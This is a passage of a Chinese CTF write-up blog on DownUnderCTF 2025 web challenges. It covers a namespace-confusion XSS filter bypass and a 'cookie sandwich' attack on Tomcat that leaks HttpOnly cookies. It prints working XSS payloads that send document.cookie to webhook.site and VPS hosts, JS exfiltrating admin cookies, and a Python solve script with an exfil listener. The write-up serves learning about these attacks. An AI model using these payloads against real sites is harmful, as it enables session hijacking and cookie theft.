class="property">innerHTML</span> = t.<span class="property">innerHTML</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Final&quot;</span>, myoutput.<span class="property">innerHTML</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>总的功能就是<strong>删除长度为6或者8的标签名，并删除所有属性：如 onerror、onclick 等</strong></p>
+<p>一开始我以为只是个小小的过滤，谁知道涉及这么深。。。</p>
+<p>这个的原理是<strong>通过混淆命名空间绕过DOMPurify实现xss</strong>：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219089#h2-0">通过混淆命名空间绕过DOMPurify实现XSS-安全KER - 安全资讯平台</a></p>
+<p><strong>DOMPurify</strong>是一款常用的HTML过滤库，可以处理（来自用户的）不受信任的HTML片段，<strong>删除可能导致XSS的所有元素及属性</strong>。</p>
+<p>虽然这一题没用DOMPurify ，但原理都差不多</p>
+<p>首先，在这题中：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> t = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;template&quot;</span>); <span class="comment">//构造和操作 DOM 结构</span></span><br><span class="line">t.<span class="property">innerHTML</span> = inp;</span><br><span class="line"><span class="comment">//把用户传入的 HTML 字符串 inp 当作 &lt;template&gt; 的 HTML 内容，浏览器会自动将其解析成 DOM 结构。</span></span><br></pre></td></tr></table></figure>
+<p>而在题解中提到：</p>
+<p><img src="../images/0250722005059109.png" alt="image-20250722005059109" /></p>
+<p>原理我肯定是看不懂的，记住有这么个情况就好了</p>
+<p>绕过payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;malignmark&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250722005307418.png" alt="image-20250722005307418" /></p>
+<p>tql</p>
+<p>获取Cookie：</p>
+<p><strong>webhook进行外带</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;malignmark&gt;&lt;style&gt;&lt;/math&gt;&lt;img src=x onerror=&quot;new Image().src=&#x27;	https://webhook.site/7cf2dde9-243b-49e3-8ccb-8c988a15f7c9/c?c=&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>提交之后点击Report this page</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;div*506&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">  &lt;caption&gt;</span><br><span class="line">    &lt;svg&gt;</span><br><span class="line">      &lt;title&gt;</span><br><span class="line">        &lt;table&gt;&lt;caption&gt;&lt;/caption&gt;&lt;/table&gt;</span><br><span class="line">      &lt;/title&gt;</span><br><span class="line">      &lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=x onerror=&quot;new Image().src=&#x27;	https://webhook.site/3a10a1bc-4d7c-459e-b990-0314907e56ca/c?c=&#x27;+document.cookie&quot;&gt;&quot;&gt;&lt;/a&gt;&lt;/style&gt;</span><br><span class="line">    &lt;/svg&gt;</span><br><span class="line">  &lt;/caption&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250722011613806.png" alt="image-20250722011613806" /></p>
+<p><strong>VPS外带</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;malignmark&gt;&lt;style&gt;&lt;/math&gt;&lt;img src=1 onerror=&quot;fetch(`VPS/$&#123;document.cookie&#125;`)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>向VPS发送请求</p>
+<p>然后在日志文件中查看cookie</p>
+<h3 id="sweet_treatcookie-sandwiching攻击窃取httponly-cookie"><a class="markdownIt-Anchor" href="#sweet_treatcookie-sandwiching攻击窃取httponly-cookie"></a> Sweet_Treat（Cookie Sandwiching攻击窃取HTTPOnly Cookie）</h3>
+<p>题目背景：</p>
+<p>该挑战旨在展示一种称为“Cookie Sandwiching”攻击的技术的存在和利用，在这种攻击中，即使攻击者将 <strong>HttpOnly 属性设置为 true</strong>，攻击者也能够<strong>窃取 cookie</strong>，这通常是许多 XSS 发现最终在渗透测试或漏洞赏金期间没有产生足够影响的原因。</p>
+<p>没怎么看懂，以后深入学了再回来看看</p>
+<p>参考原理：<br />
+<a target="_blank" rel="noopener" href="https://cn-sec.com/archives/4242539.html">利用Cookie Sandwich窃取HttpOnly Cookie | CN-SEC 中文网</a></p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">Stealing HttpOnly cookies with the cookie sandwich technique | PortSwigger Research</a></p>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie">Bypassing WAFs with the phantom $Version cookie | PortSwigger Research</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.ankursundara.com/cookie-bugs/">饼干虫 - 走私和注射 — Cookie Bugs - Smuggling &amp; Injection</a></p>
+<p>题解：</p>
+<p><a target="_blank" rel="noopener" href="https://nanimokangaeteinai.hateblo.jp/#Web-223-Sweet-Treat-58-solves">https://nanimokangaeteinai.hateblo.jp/#Web-223-Sweet-Treat-58-solves</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/sweet_treat/solve/WRITEUP.md">Challenges_2025_Public/web/sweet_treat/solve/WRITEUP.md 在 main ·DownUnderCTF/Challenges_2025_Public — Challenges_2025_Public/web/sweet_treat/solve/WRITEUP.md at main · DownUnderCTF/Challenges_2025_Public</a></p>
+<h4 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点</h4>
+<p>在该题中的Dockerfile文件中显示正在使用的映像是 <code>tomcat：9.0-jdk11</code> 映像</p>
+<p>除了标准 Cookie 处理器外，Apache tomcat 还默认使用旧版 Cookie 处理器来支持较旧的浏览器/版本的 Cookie。</p>
+<p>从本质上讲，这<strong>允许攻击者添加名为 <code>$Version</code> 的 cookie 来降级 cookie 版本</strong>，以强制浏览器利用旧版 cookie 处理器来读取和作 cookie。</p>
+<p><strong>旧版 Cookie 允许在值中包含特殊字符</strong></p>
+<p>“Cookie Sandwiching”技术通过操纵 Cookie 中的特殊字符，影响 Web 服务器对 Cookie 的解析方式。攻击者可以通过巧妙插入引号和旧版 Cookie，使服务器错误解析 Cookie 头的结构，从而可能将本应受保护的 HttpOnly Cookie 暴露给客户端脚本。</p>
+<p><strong>重点：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">由于 Chrome 浏览器不支持旧版 Cookie，因此允许攻击者使用 JavaScript 创建以 $ 开头的 Cookie 名，例如 $Version。此外，任意 Cookie 值中都可以包含引号。以下代码展示了如何创建一个 Cookie 三明治，以窃取受限制的 Cookie 值：</span><br><span class="line"></span><br><span class="line">document.cookie = `$Version=1;`;document.cookie = `param1=&quot;start`;// 三明治中的 Cookie 会被服务端合并至 param1 document.cookie = `param2=end&quot;;`;									的值中</span><br><span class="line"></span><br><span class="line">在请求中的 Cookie 头可能会被解析为：</span><br><span class="line">GET / HTTP/1.1Cookie: $Version=1; param1=&quot;start; sessionId=secret; param2=end&quot;</span><br><span class="line"></span><br><span class="line">服务器响应为：</span><br><span class="line">HTTP/1.1 200 OKSet-Cookie: param1=&quot;start; sessionId=secret; param2=end&quot;;</span><br></pre></td></tr></table></figure>
+<p>在 Apache Tomcat 中，Cookie 的解析方式如下：</p>
+<ul>
+<li>解析器兼容 RFC6265 和 RFC2109 两种标准，若字符串以 $Version 开头，将默认使用旧版解析逻辑。</li>
+<li>若 Cookie 值以双引号开头，将持续读取直到下一个未转义的双引号。</li>
+<li>对以反斜杠（）开头的字符进行反转义。</li>
+</ul>
+<h4 id="后面我自己的理解"><a class="markdownIt-Anchor" href="#后面我自己的理解"></a> 后面我自己的理解</h4>
+<p>攻击者在客户端构造多个同名 Cookie，利用路径优先级或顺序差异，影响服务端的解析逻辑或触发漏洞。</p>
+<p>它利用了这样一个特性：</p>
+<blockquote>
+<p>浏览器可以存多个相同名字的 Cookie，只要 <code>Path</code> 不同。</p>
+</blockquote>
+<p>而服务端通常在接收 Cookie 时，不会严格区分路径，会直接按字符串顺序从 <code>Cookie:</code> 头部中<strong>第一个匹配的键值对</strong>作为真实的值。</p>
+<p>浏览器允许如下结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: token=attacker; Path=/admin</span><br><span class="line">Set-Cookie: token=real; Path=/</span><br></pre></td></tr></table></figure>
+<p>然后：</p>
+<p>访问 <code>/admin</code>：浏览器只发送 <code>token=attacker</code></p>
+<p>访问 <code>/</code> 或 <code>/home</code>：浏览器发送 <code>token=real</code></p>
+<p>服务端处理请求时，接收到的 <code>Cookie:</code> 头可能是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: token=attacker; token=real</span><br></pre></td></tr></table></figure>
+<p>在大多数语言（如 PHP、Java Servlet、Node.js）中：</p>
+<ul>
+<li>服务端 <strong>不处理路径逻辑</strong></li>
+<li>只看第一个 <code>token=...</code></li>
+<li>所以服务端认为：<code>token=attacker</code></li>
+</ul>
+<p>这就给了攻击者机会插入自己伪造的值。</p>
+<p>后面我们通过解题来理解</p>
+<h4 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h4>
+<p>开题有注册登录：</p>
+<p><img src="../images/20250722122927969.png" alt="image-20250722122927969" /></p>
+<p>之前我注册了1，现在注册个2</p>
+<p><img src="../images/20250722123011003.png" alt="image-20250722123011003" /></p>
+<p>可以看到index.jsp就是列出user用户的</p>
+<p>然后看Edit Profile，是用来发送xss的</p>
+<p><img src="../images/20250722123108826.png" alt="image-20250722123108826" /></p>
+<p>题目其实还给了源码，但是太多了，就稍微讲一下</p>
+<p><strong>register.jsp</strong>：注册用户，插入数据库</p>
+<p><strong>login.jsp</strong>：登录</p>
+<p>logout.jsp：登出</p>
+<p><strong>index.jsp</strong>:</p>
+<p>列出user，里面有几个关键代码：后面提到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  Cookie[] cookies = request.getCookies();</span><br><span class="line">  <span class="keyword">if</span> (cookies != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (Cookie c : cookies) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="string">&quot;language&quot;</span>.equals(c.getName())) &#123;</span><br><span class="line">              lang = c.getValue();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// …</span></span><br><span class="line">&lt;html lang=<span class="string">&quot;&lt;%= lang %&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>edit_profile.jsp</strong>：有填写框，点击save填写的内容会被插入数据库的aboutme字段，点击Report Profile to Admin会让robot访问</p>
+<p><strong>/admin/admin-review.jsp</strong>： admin 从 <code>/admin/admin-review.jsp</code> 查看用户的帖子，但在此处显示aboutme时没有进行转义。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;about-content&quot;&gt;&lt;%= (aboutMe != null &amp;&amp; !aboutMe.isEmpty()) ? aboutMe : &quot;No about me section provided.&quot; %&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+<p>因此这里存在xss漏洞</p>
+<p>我们可以正常输入然后save，后面点击Report Profile to Admin后robot会访问未进行转义的payload</p>
+<p>在/admin/admin-review.jsp中可以看到，<strong>管理员的Cookie中其实有flag</strong>，但我们是拿不到的，因为我们无法变成admin，且给flag设置了HttpOnly属性，不能通过document.cookie获取到</p>
+<p><img src="../images/20250722131152162.png" alt="image-20250722131152162" /></p>
+<p>这里就能用我们的Cookie三明治攻击了</p>
+<p>目前我们已知在服务端 管理员有两个cookie，一个JSESSIONID，一个flag,都是HttpOnly属性，正常我们获取不到flag，但那不是有个<code>/admin/admin-review.jsp</code>吗，就可以<strong>让admin自己去访问我们的payload页面，然后由管理员的浏览器发送带有 flag 的请求</strong></p>
+<p>我们希望构造出来的Cookie结构是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Version=1; steal=&quot;; &lt;User&#x27;s Cookies&gt;; end=&quot;; </span><br></pre></td></tr></table></figure>
+<p>执行上述作将使用户的 cookie 成为 steal cookie 的值，例如，如果用户有 cookie JSESSIONID，那么 steal 的值将是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal=&quot;JSESSIONID=XXXX; end=&quot;</span><br></pre></td></tr></table></figure>
+<p>而这个steal就是我们前面说的<code>&lt;html lang=&quot;&lt;%= lang %&gt;&quot;&gt;</code>的language这个Cookie</p>
+<p>但是这里有个问题就是Cookie的发送顺序</p>
+<p>使 $Version 排在首位，需确保它比其他 Cookie <strong>更早创建或具有更长的 Path 属性</strong>。虽然我们无法控制受害者 Cookie 的创建时间，但可以设置路径。例如，将 Cookie 的 Path 设置为 /json。</p>
+<p>因此我们的Cookie构造为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`$Version=1; path=/index.jsp;`</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`language=&quot;start; path=/index.jsp;`</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`end=&quot;; path=/`</span>;</span><br></pre></td></tr></table></figure>
+<p>这样我们后面发送后服务的处理Cookie的顺序就固定为了<code>language=&quot;; &lt;User's Cookies&gt;; end=&quot;;</code></p>
+<hr />
+<p><strong>这里有个疑惑：为什么会带出没有构建的Cookie呢？</strong></p>
+<p>用到了一个<strong>错误解析</strong>的知识点（前面有提到）：<code>在document.cookie = language=&quot;start; path=/index.jsp;;</code>中这个 Cookie <strong>没有正确闭合引号</strong>（<code>&quot;start</code> 后面没有 <code>&quot;</code>），导致浏览器在发送 Cookie 时 <strong>错误解析</strong>：</p>
+<ul>
+<li>浏览器认为 <code>language=&quot;start; path=/index.jsp;</code> 是一个 <strong>未闭合的 Cookie 值</strong>。</li>
+<li>当浏览器发送请求时，它会 <strong>把所有 Cookie 拼接成一个字符串</strong>，而 <code>JSESSIONID</code> 和 <code>flag</code> 被错误地当作 <code>language</code> 的值的一部分。</li>
+</ul>
+<hr />
+<p>然后我们就需要抓取/index.jsp的页面，使admin访问我们payload的时候通过<code>&lt;html lang=&quot;&lt;%= lang %&gt;&quot;&gt;</code>把language外带出来</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`$Version=1; path=/index.jsp;`</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`language=&quot;start; path=/index.jsp;`</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">`end=&quot;; path=/`</span>;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/index.jsp&quot;</span>).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>)&#123;<span class="keyword">return</span> res.<span class="title function_">text</span>();&#125;).<span class="title function_">then</span>(</span><br><span class="line"><span class="keyword">function</span> (<span class="params">html</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Sending exfil&quot;</span>);</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&quot;https://webhook.site/5d490ba9-cecc-4e0d-b95e-da005f94c3ac/exfil&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">body</span>: html.<span class="title function_">substring</span>(<span class="number">0</span>,<span class="number">135</span>) <span class="comment">//带出/index.jsp这个html页面的前135个字符</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>save之后Report Profile to Admin</p>
+<p><img src="../images/20250722133946109.png" alt="image-20250722133946109" /></p>
+<p>成功地错误输出lang外带出flag</p>
+<hr />
+<p><strong>总结：</strong></p>
+<p>通过document.cookie设置cookie处于未闭合状态，服务端<strong>错误解释</strong> Cookie，浏览器在发送请求时，会把 <strong>所有 Cookie 拼接成一个字符串</strong>，用 <code>; </code>分隔，从而导致 <code>lang</code> 属性中出现flag和JSESSIONID</p>
+<hr />
+<h4 id="官方解题脚本"><a class="markdownIt-Anchor" href="#官方解题脚本"></a> 官方解题脚本</h4>
+<p>通过指定所需的参数来运行脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 solve.py --lhost &lt;attacker_ip&gt; --url http[s]://&lt;challenge_url&gt;/ --lport &lt;attacker_port_for_http_listener&gt;</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] Running HTTP Server on port %s to catch admin interaction 8002</span><br><span class="line">[+] User registered and logged in successfully</span><br><span class="line">[+] Injecting XSS payload into the admin page</span><br><span class="line">[+] XSS payload sent, waiting for admin interaction...</span><br><span class="line">172.18.0.2 - - [01/Jun/2025 13:33:44] &quot;POST /exfil HTTP/1.1&quot; 200 -</span><br><span class="line">[+] XSS payload executed, received data:</span><br><span class="line">[+] Flag:  DUCTF&#123;1_th0ught_y0u_c0uldnt_st34l_th3m&#125;</span><br><span class="line">[+] JSESSIONID:  DFEF73BAC6CB76DC912732F24C35AF8A</span><br><span class="line">[+] Data:  &lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;&quot;start; JSESSIONID=DFEF73BAC6CB76DC912732F24C35AF8A; flag=DUCTF&#123;1_th0ught_y0u_c0uldnt_st34l_th3m&#125;; end=</span><br><span class="line">[+] Admin interaction detected, shutting down server...</span><br></pre></td></tr></table></figure>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Generally required imports</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># If a server needs to be spun up to deliver payloads etc</span></span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line">JS_PAYLOAD = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">document.cookie = `$Version=1; path=/index.jsp;`;</span></span><br><span class="line"><span class="string">document.cookie = `language=&quot;start; path=/index.jsp;`;</span></span><br><span class="line"><span class="string">document.cookie = `end=&quot;; path=/`;</span></span><br><span class="line"><span class="string">fetch(&quot;/index.jsp&quot;).then(function (res)&#123;return res.text();&#125;).then(</span></span><br><span class="line"><span class="string">function (html) &#123;</span></span><br><span class="line"><span class="string">    console.log(&quot;Sending exfil&quot;);</span></span><br><span class="line"><span class="string">    fetch(&quot;http://&lt;attacker_lhost&gt;:&lt;attacker_lport&gt;/exfil&quot;,</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        method: &quot;POST&quot;,</span></span><br><span class="line"><span class="string">        body: html.substring(0,135)</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&lt;/script&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">xss_event = threading.Event()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_web_server</span>():</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">MyHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.path.endswith(<span class="string">&#x27;/exfil&#x27;</span>):</span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">                <span class="variable language_">self</span>.send_header(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Length&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(<span class="string">&quot;thanks&quot;</span>)))</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">&quot;thanks&quot;</span>.encode())</span><br><span class="line">                content_length = <span class="built_in">int</span>(<span class="variable language_">self</span>.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">                post_data_bytes = <span class="variable language_">self</span>.rfile.read(content_length)</span><br><span class="line">                response_data = post_data_bytes.decode()</span><br><span class="line">                flag = re.search(<span class="string">&quot;flag=(.*);&quot;</span>, response_data).group(<span class="number">1</span>)</span><br><span class="line">                JSESSIONID = re.search(<span class="string">&quot;JSESSIONID=(.*); flag&quot;</span>, response_data).group(<span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] XSS payload executed, received data:&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] Flag: &quot;</span>, flag)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] JSESSIONID: &quot;</span>, JSESSIONID)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] Data: &quot;</span>, response_data.lstrip(<span class="string">&quot;\n&quot;</span>).rstrip(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] Admin interaction detected, shutting down server...&quot;</span>)</span><br><span class="line">                xss_event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">&quot;[+] Running HTTP Server on port %s to catch admin interaction&quot;</span>, LPORT)</span><br><span class="line">    httpd = HTTPServer((LHOST, <span class="built_in">int</span>(LPORT)), MyHandler)</span><br><span class="line">    threading.Thread(target=httpd.serve_forever).start()</span><br><span class="line">    <span class="keyword">return</span> httpd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_user</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: USERNAME,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: PASSWORD</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/register.jsp&quot;</span>, data=data)</span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span>, <span class="string">&quot;Failed to register user&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">session</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: USERNAME,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: PASSWORD</span><br><span class="line">    &#125;</span><br><span class="line">    response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/login.jsp&quot;</span>, data=data)</span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span>, <span class="string">&quot;Failed to log in&quot;</span></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_xss_payload</span>(<span class="params">session</span>):</span><br><span class="line">    xss_payload = JS_PAYLOAD.replace(<span class="string">&quot;&lt;attacker_lhost&gt;&quot;</span>, LHOST).replace(<span class="string">&quot;&lt;attacker_lport&gt;&quot;</span>, LPORT)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;aboutMe&quot;</span>: xss_payload</span><br><span class="line">    &#125;</span><br><span class="line">    response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/edit_profile.jsp&quot;</span>, data=data)</span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span>, <span class="string">&quot;Failed to inject XSS payload&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report_profile</span>(<span class="params">session</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;reportProfile&quot;</span>: <span 